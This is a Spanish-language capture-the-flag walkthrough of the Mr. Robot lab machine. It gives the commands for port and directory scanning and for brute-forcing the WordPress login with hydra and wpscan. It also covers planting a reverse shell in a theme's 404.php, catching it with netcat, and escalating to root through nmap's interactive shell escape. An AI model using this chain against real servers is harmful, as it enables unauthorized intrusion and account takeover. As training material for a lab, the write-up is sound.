En primer lugar descargamos la máquina de:

La montamos en VirtualBox (en nuestro caso)

Para comenzar el análisis buscamos la dirección ip de la máquina objetivo:

# netdiscover

Tenemos la ip: 192.168.1.105 (1)

Ahora procedemos a realizar un escaneo de puertos:

# nmap -sV -Pn 192.168.1.105

Vemos que tiene un puerto ssh cerrado y un http abierto. (2)
Por tanto abrimos firefox y accedemos a la ip.
Nos encontramos una aplicación bastante divertida, nos entretenemos un rato con ella pero no aporta nada interesante.

Realizamos un Dirb a la página para encontrar directorios que puedan ser interesantes.

# dirb http://192.168.1.105

Encontramos que existe el archivo robots.txt y vemos una instalación de Wordpress (puede ser interesante)

Accedemos a robots.txt (192.168.1.105/robots.txt) y encontramos dos entradas (3) accedemos a la que parece ser una flag: flag-1-of-3.txt (192.168.1.105/key-1-of-3.txt).
Tenemos la primera flag (4)

Ahora accedemos a 192.168.1.105/fsocity.dic Descargamos lo que parece ser un diccionario para fuerza bruta.
Eliminemos repetidos y ordenemoslo:

# sort -u fsocity.dic > fsocity_sorted.dic

Guardamos lo que tenemos de momento y realizamos un nikto a ver si encontramos algo de valor (5):

# nikto -h 192.168.1.105

Nada nuevo, hay una instalación de wordpress y robots.txt

Entremos a la instalación de wordpress.
Probamos con el usuario por defecto: admin-admin. Nada. Vemos que wordpress nos dice que no existe ese usuario con un aviso muy concreto. (6)

Podemos probar a atacar con fuerza bruta, pero antes probemos a sacar los usuarios con wpscan:

wpscan --url 192.168.1.105 --enumerate u

Nos dice que no puede enumerar los usuarios.
Probemos a hacer un ataque de fuerza bruta con hydra:

# hydra 192.168.1.105 -L fsocity_sorted.dic http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit:Invalid username" -p test -t 64

Es decir:
-L (lista de usuarios a probar: fsocity_sorted.dic)
http-form-post (forma en la que se hace el envio de los datos)
"[datos]"{
  /wp-login.php (archivo a atacar)
  log=^USER^ (En el campo log que se ve en el código fuente de la página web introduce el usuario que estés probando)
  pwd=^PASS^ (En el campo pwd la contraseña especificada por -p test)
  wp-submit (botón a pulsar)
  Invalid username (aviso si el usuario es erróneo)
}
-t 64 (número de threads, agilizar el proceso)

Tenemos el usuario: Elliot (casualmente es el nombre del protagonista de la serie jeje) (7)

Probemos a atacar wordpress con wpscan (otra vez) para encontrar la contraseña:

# wpscan -u 192.168.1.105 -w /home/oscar/Downloads/fsocity_sorted.dic --username Elliot

Obtenemos la contraseña: ER28-0652 (8)

Entramos a wp-admin con esas credenciales y procedemos a introducir una reverse-shell (la que mas me gusta es la de pentest-monkey)
Modificamos el archivo (introducimos nuestra ip y el puerto en el que lo queremos, yo dejaré el 1234)
Para introducir la revershe-shell vamos a modificar un theme de wordpress con el código de la shell.
Accedemos a Appearance-Editor. Seleccionamos el tema que queremos modificar (yo usaré el Twenty Thirteen)
Seleccionamos un archivo php, yo usaré el de 404.php (fallo de página)
Borramos todo el código e introducimos el de la shell. Guardamos.

Establecemos la esucha con netcat:

# nc -v -l -n -p 1234

Ejecutamos la shell accediendo a la direccion: http://192.168.1.105/wp-content/themes/twentythirteen/404.php
Netcat nos detecta la conexión (9)
Accedemos a la carpeta home y buscamos los usrs: encontramos robot

# cd home/robot
# ls

Encontramos la segunda flag y un archivo que parece hacer una referencia a una contraseña (10)
No podemos abrir la flag porque dice que no tenemos permisos. Abriendo el fichero de la contraseña vemos lo que parece la contraseña de robot, encriptada por md5 (11)
La desencriptamos y obtenemos la contraseña: abcdefghijklmnopqrstuvwxyz
Probamos a cambiar de usuario:

# su - robot

Nos dice que ese comando tiene que ser ejecutado desde una terminal. Probamos a abrir un bash

# /bin/bash

Sigue fallando. Probemos a abrirla con python:

# python -c "import pty; pty.spawn('/bin/bash');"

Vemos que nos abre una terminal en un usuario llamado daemon (12)
Realicemos el cambio de usuario y volvamos a abrir bash.

# su - robot
# python -c "import pty; pty.spawn('/bin/bash');"

Ahora somos robot (13), abrimos la flag (14), como ahora somos el usuario correcto podemos abrirla.
Lo siguiente sería poseer derechos de root (posiblemente la siguiente flag estará en /root)
Tras pegarme con intentar abrir el puerto 22 (ssh) para poder tener mejor acceso o intentar hacer una fuerza bruta con hydra y el diccionario que nos han dado.
No tiene instalado iptables instalado, desisto.
Mientras realizaba esas pruebas me doy cuenta que tiene instalado nmap (lo he usado realmente darme cuenta de ello para ver los puertos abiertos)
Buscando mas maneras encuentro este enlace: https://www.rebootuser.com/?p=1623
Vemos que nmap --interactive puede hacer un shell-escape

# nmap --interactive
# !sh  (Accedemos a la shell)
# cd /root

Tenemos la ultima flag (15)
